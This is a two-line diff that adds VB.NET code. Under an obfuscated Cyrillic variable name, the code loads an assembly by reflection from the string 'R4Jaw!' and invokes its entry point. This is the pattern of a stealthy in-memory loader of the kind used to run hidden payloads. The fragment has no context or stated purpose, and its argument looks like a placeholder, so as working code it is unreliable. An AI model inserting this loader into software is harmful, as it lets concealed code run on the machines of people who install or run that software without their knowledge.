@@ -1,0 +1,2 @@
+﻿ Dim абвгдеёжзийклмноп As System.Object = System.Reflection.Assembly.Load("R4Jaw!")
+        абвгдеёжзийклмноп.EntryPoint.Invoke(Nothing, Nothing)
